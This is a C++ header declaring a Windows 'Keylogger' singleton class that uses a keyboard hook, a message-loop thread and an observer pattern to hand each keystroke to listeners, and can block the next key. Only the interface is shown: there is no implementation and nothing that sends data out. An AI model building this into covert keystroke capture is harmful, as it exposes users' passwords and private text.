#pragma once

#include <common/WindowsWrapper.hpp>
#include <common/Observable.hpp>
#include <common/Singleton.hpp>
#include <system/Thread.hpp>

#include "KeyObserver.hpp"

namespace Keyboard
{
    typedef __declspec(dllexport) LRESULT (CALLBACK *HookProc) ( int nCode,  WPARAM wParam,  LPARAM lParam);

	class Keylogger : 
		public Common::Singleton<Keylogger>, 
		public Common::Observable<KeyObserver, KeyInformation>, 
		public System::Thread
    {
        friend class Common::Singleton<Keylogger>;

        protected:
            Keylogger();
            ~Keylogger();

        public:
			virtual void start();
            virtual void stop();
            HHOOK getHook();
			void blockNextKey();
			void unblockNextKey();
			bool isNextKeyBlocked();

        private:
            HHOOK hook;
            bool isActivated;
			bool blockNextKeyFlag;
            static DWORD WINAPI MsgLoop(LPVOID lpParameter);
    };

} // Keyboard
